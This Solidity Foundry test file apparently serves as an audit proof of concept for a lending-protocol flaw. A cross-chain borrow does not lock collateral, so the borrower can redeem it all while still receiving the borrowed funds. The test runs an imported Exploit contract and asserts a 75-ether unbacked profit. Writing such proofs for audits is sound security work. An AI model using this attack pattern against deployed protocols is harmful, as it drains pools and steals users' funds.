// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "forge-std/Test.sol";
import {Exploit, MiniToken, CrossChainRouter, CoreRouter} from "./58390-lend-borrower-can-redeem-collateral-immediately-after-borrowing.sol";

// LEND H-21 (finding 58390): CrossChainRouter.borrowCrossChain() adds collateral
// tracking and fires the borrow message WITHOUT locking the collateral, so the
// user can immediately redeem() all of it on the source chain (the pending borrow
// is unrecorded, so the liquidity check passes). The destination chain then
// authorizes the borrow against the stale collateral snapshot. Supply 100e18,
// borrow 75e18 cross-chain, redeem 100e18 -> attacker keeps collateral AND funds.
contract Finding58390Test is Test {
    function test_exploit_redeemAfterCrossChainBorrow_drainsPool() public {
        Exploit e = new Exploit();
        vm.deal(address(e), 1 ether); // fund the source router's native balance requirement
        e.run();

        emit log_named_uint("collateral returned (Chain A)", e.collateralReturned());
        emit log_named_uint("borrowed received (Chain B)", e.borrowedReceived());
        emit log_named_uint("profit (unbacked)", e.profit());

        // attacker recovered its FULL collateral on Chain A
        assertEq(e.collateralReturned(), 100 ether, "collateral fully redeemed on source chain");
        // AND received the cross-chain borrow on Chain B against the stale snapshot
        assertEq(e.borrowedReceived(), 75 ether, "cross-chain borrow paid out on stale collateral");
        // net unbacked funds drained from the destination pool
        assertGt(e.profit(), 0, "attacker holds an entirely unbacked, undercollateralized position");
        assertEq(e.profit(), 75 ether, "profit equals the drained borrow amount");
    }
}
